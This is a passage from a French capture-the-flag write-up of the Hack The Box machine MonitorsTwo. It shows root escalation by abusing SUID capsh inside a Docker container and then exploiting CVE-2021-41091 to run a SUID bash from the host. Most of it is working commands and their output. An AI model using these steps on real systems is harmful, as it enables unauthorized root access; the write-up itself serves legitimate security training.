┌──(marcus㉿monitorstwo)-[~]
└─$ cat user.txt
<********************************>
`````

À ce niveau nous retournons donc comme la première fois dans le dossier ``/var/mail/`` où nous trouverons le mail de l'admin destiné aux utilisateurs du système et faisant mention de trois CVE, dont seul le dernier concernant une version de contenant vulnérable sera exploitable dans notre cas:

```bash
┌──(marcus㉿monitorstwo)-[~]
└─$ cat /var/mail/marcus

From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of
Dear all,...

```

>La description de la vulnérabilité fait référence aux répertoires sous /var/lib/docker/, donc nous ne sommes intéressés que par ceux-ci.

```bash
# Listage des conteneurs Docker
┌──(marcus㉿monitorstwo)-[~]
└─$ findmnt
TARGET                                SOURCE     FSTYPE     OPTIONS

<SNIP>
│                                                nsfs       rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/over
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/over
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
```

Nous devons déterminer le conteneur associé à l'application Cacti, car notre session de shell conteneurisé se trouve à l'intérieur de celui-ci. Nous pouvons le faire en créant un fichier depuis notre session de shell conteneurisé (notre point d'entrée initial), puis vérifier si ce fichier est disponible depuis l'extérieur du conteneur avec marcus.

```bash
# Déplaçons nous vers le répertoire /tmp et créons un fichier test

www-data@50bca5e748b0:/var/www/html$ cd /tmp
www-data@50bca5e748b0:/tmp$ touch test
```

Les contenus les plus lourds sont généralement des images, et si le pilote de stockage par défaut overlay2 est utilisé, alors ces images Docker sont stockées dans ``/var/lib/docker/overlay2`` ([freecodecamp][15]). Par conséquent, nous devons juste vérifier 2 des 4 chemins de conteneurs trouvés ci-dessus :

Nous pouvons vérifier chacun de ces 2 conteneurs séquentiellement pour voir lequel contient le fichier test :

```bash
┌──(marcus㉿monitorstwo)-[~]
└─$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test
ls: cannot access '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test': No such file or directory
┌──(marcus㉿monitorstwo)-[~]
└─$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
-rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
```

Le conteneur Cacti est donc: ``c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1``. Maintenant, nous devons attribuer des ``permissions SUID`` à ``/bin/bash``, afin que ``marcus`` puisse l'exécuter depuis l'extérieur et obtenir un ``shell root``. Pour ce faire, nous devons d'abord élever nos privilèges à l'intérieur du conteneur.

Celà se fera comme dans la première méthodologie en recherchant les fichiers avec un bit SUID:

```bash
www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

En suivant les instruction d'exploitation du binaire `/sbin/capsh` comme indiqué sur [Gtfobins][4] nous obtenons notre accès root:

```bash

#root
www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --
root@50bca5e748b0:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

- Étant ``root`` nous pouvons donc assigner le bit `SUID` au binaire /bin/bash:

```bash
# assignation de permission SUID

root@50bca5e748b0:/tmp# chmod u+s /bin/bash
# vérification
root@50bca5e748b0:/tmp# ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Enfin, nous pouvons retourner à la session SSH de marcus et exécuter le binaire bash en utilisant l'option `-p` ([link][16])

flag:

```bash
┌──(marcus㉿monitorstwo)-[~]
└─$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 bash

┌──(marcus㉿monitorstwo)-[/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin]
└─$ ./bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# cat /root/root.txt
<********************************>
```


[1]:	https://app.hackthebox.com/machines/MonitorsTwo
[2]:	https://nvd.nist.gov/vuln/detail/CVE-2022-46169
[3]:	https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
[4]:	https://gtfobins.github.io/gtfobins/capsh/#suid
[5]:	https://nvd.nist.gov/vuln/detail/CVE-2021-33033
[6]:	https://wiki.ubuntu.com/FocalFossa/ReleaseNotes
[7]:	https://nvd.nist.gov/vuln/detail/CVE-2020-25706 
[8]:	https://nvd.nist.gov/vuln/detail/CVE-2021-41091
[9]:	https://github.com/UncleJ4ck/CVE-2021-41091
[10]:	https://www.youtube.com/watch?v=dJfbogs8Yz0&t=8s
[11]:	https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/
[12]:	https://www.exploit-db.com/exploits/51166
[13]:	https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/cacti_unauthenticated_cmd_injection.rb#L143
[14]:	https://pento.net/2009/02/27/the-g-modifier-in-the-mysql-command-line-client/
[15]:	https://www.freecodecamp.org/news/where-are-docker-images-stored-docker-container-paths-explained/
[16]:	https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html#:~:text=If%20the%20%2Dp%20option%20is,real%20user%20and%20group%20ids.&text=Enable%20restricted%20shell%20mode.,once%20it%20has%20been%20set

[image-1]: 	img/MonitorsTwo.png
[image-2]:	img/home.png
[image-3]:	img/vuln.png
[image-4]:	img/capsh.png
[image-5]:	img/linuxkernel.png
[image-6]:	img/machine_pwned.png
[image-7]:	img/burp_login_request.png
[image-8]:	img/burp_fatal_error.png
[image-9]:	img/xForwardedFor.png
[image-10]:	img/sleep_attempt.png
[image-11]:	img/payload_pos.png
[image-12]:	img/payload_settings.png
[image-13]:	img/brute_results.png
[image-14]:	img/burp_responseTime.png
[image-15]:	img/proc.png
[image-16]:	img/uptime.png
[image-17]:	img/revshell_payload.png
